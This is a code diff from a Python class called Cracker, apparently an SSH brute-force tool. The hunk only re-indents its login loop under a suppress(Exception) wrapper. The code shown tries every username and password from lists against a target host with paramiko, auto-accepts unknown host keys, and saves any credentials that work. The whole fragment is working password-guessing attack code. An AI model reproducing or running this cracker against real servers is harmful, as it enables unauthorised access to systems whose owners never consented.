@@ -173,24 +173,25 @@ class Cracker:
             
             for username in self.root.userlist:
                 for password in self.root.passlist:
-                    try:
+                    with suppress(Exception):
+                        try:
 
-                        sshClient = SSHClient()
-                        sshClient.set_missing_host_key_policy(AutoAddPolicy()) 
-                        sshClient.load_system_host_keys()
-                        sshClient.connect(target, port, username, password, timeout=1)
-                        self.root.save(target, port, username, password)
+                            sshClient = SSHClient()
+                            sshClient.set_missing_host_key_policy(AutoAddPolicy()) 
+                            sshClient.load_system_host_keys()
+                            sshClient.connect(target, port, username, password, timeout=1)
+                            self.root.save(target, port, username, password)
 
-                    except TimeoutError:
-                        Logger.fail("[%s] Timeout !" % target)
-                    except AuthenticationException:
-                        Logger.fail("[%s] Invalid user or password %s:%s" % (target, username, password))
-                    except SSHException:
-                        Logger.warning("[%s] an SSHException recived !" % target)
-                    except EOFError:
-                        Logger.warning("[%s] an EOFError recived !" % target)
-                    except Exception as e:
-                        Logger.warning("Unknown error recived ", e)
+                        except TimeoutError:
+                            Logger.fail("[%s] Timeout !" % target)
+                        except AuthenticationException:
+                            Logger.fail("[%s] Invalid user or password %s:%s" % (target, username, password))
+                        except SSHException:
+                            Logger.warning("[%s] an SSHException recived !" % target)
+                        except EOFError:
+                            Logger.warning("[%s] an EOFError recived !" % target)
+                        except Exception as e:
+                            Logger.warning("Unknown error recived ", e)
                         
             self.root.tried += 1
 
